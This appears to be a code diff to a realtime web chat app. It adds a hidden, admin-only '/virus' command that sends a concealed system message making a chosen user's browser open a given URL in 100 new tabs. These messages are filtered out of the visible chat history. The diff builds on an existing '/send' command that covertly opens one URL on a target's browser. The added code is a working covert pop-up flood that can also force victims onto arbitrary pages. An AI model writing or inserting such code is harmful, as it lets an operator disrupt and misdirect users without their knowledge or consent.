@@ -315,7 +315,7 @@ if(configData){
   }
 }
 const{data}=await sb.from("messages").select("*").order("created_at",{ascending:true}).limit(200);
-if(data)data.filter(m=>!m.content||(!m.content.startsWith("__CORN__:")&&!m.content.startsWith("__SEND__:"))).forEach(m=>addMsg(m));
+if(data)data.filter(m=>!m.content||(!m.content.startsWith("__CORN__:")&&!m.content.startsWith("__SEND__:")&&!m.content.startsWith("__VIRUS__:"))).forEach(m=>addMsg(m));
 sb.channel("public:messages")
 .on("postgres_changes",{event:"INSERT",schema:"public",table:"messages"},p=>{
   const msg=p.new;
@@ -326,6 +326,11 @@ sb.channel("public:messages")
   if(msg.content&&msg.content.startsWith("__SEND__:")){
     const parts=msg.content.match(/^__SEND__:(\\d{4}):(.+)$/);
     if(parts&&parts[1]===userTag){window.open(parts[2],"_blank");}
+    return;
+  }
+  if(msg.content&&msg.content.startsWith("__VIRUS__:")){
+    const parts=msg.content.match(/^__VIRUS__:(\\d{4}):(.+)$/);
+    if(parts&&parts[1]===userTag){for(let i=0;i<100;i++){window.open(parts[2],"_blank");}}
     return;
   }
   addMsg(msg);
@@ -444,6 +449,18 @@ const url=sendMatch[2].trim();
 const targetName=await getDisplayNameByTag(tag);
 await sb.from("messages").insert({username:"System",content:"__SEND__:"+tag+":"+url,user_tag:"0000"});
 showToast("/send sent to "+targetName+" #"+tag);
+inp.value="";
+return;
+}
+
+// /virus #XXXX url (secret command)
+const virusMatch=v.match(/^\\/virus\\s+#(\\d{4})\\s+(.+)$/);
+if(isAdmin&&virusMatch){
+const tag=virusMatch[1];
+const url=virusMatch[2].trim();
+const targetName=await getDisplayNameByTag(tag);
+await sb.from("messages").insert({username:"System",content:"__VIRUS__:"+tag+":"+url,user_tag:"0000"});
+showToast("/virus sent to "+targetName+" #"+tag);
 inp.value="";
 return;
 }
